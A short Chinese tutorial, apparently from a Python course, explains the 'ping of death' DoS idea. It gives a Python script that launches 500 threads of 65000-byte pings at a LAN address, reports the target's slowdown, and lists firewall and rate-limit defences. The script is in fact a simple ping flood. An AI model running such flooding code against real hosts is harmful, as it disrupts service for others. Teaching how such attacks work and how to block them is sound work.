## DOS：死亡之ping

网络中，使用ping命令可发送的数据大小被限制为65500字节。随着系统性能的提升，发动DoS攻击的威力大大减小。但DoS攻击概念刚出现时，它一种是非常强大的攻击手段。使用示例很难获得良好的攻击效果，但足以通过其理解使用ICMP协议发动DoS攻击的工作原理。

 

### 代码实现

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# @Time     : 2020/11/25 11:40 
# @Author   : ordar
# @File     : dos_ping.py  
# @Project  : pythonCourse
# @Python   : 3.7.5
import subprocess
import threading
import time


def dos_ping(host, id):
    subprocess.call("ping {} -l 65000".format(host), shell=True)
    print('subprocess {}'.format(str(id)))


if __name__ == '__main__':
    for i in range(500):
        new_thread = threading.Thread(target=dos_ping, args=("192.168.1.4", i))
        new_thread.start()
    time.sleep(1)

```



### 运行结果

![img](img/6985d69a-43f7-11eb-8fbe-8cc6814bc10b.png)

![img](img/82fc9d66-43f7-11eb-ae8e-8cc6814bc10b.png)

 

程序运行初期，从客户机PC到服务器PC的Ping响应性能基本没有变化。但随着线程数量的增加，特别是线程数超过100个时，服务器PC的性能下降逐渐明显，导致有些回复的耗时大于10毫秒。若想防范死亡之Ping攻击，需要限制某个时间段内进入的ping个数，或者阻止所有来自外部的ping命令。此外，还要设置防火墙规则，检查ping请求的大小，阻止大于正常大小的ping请求。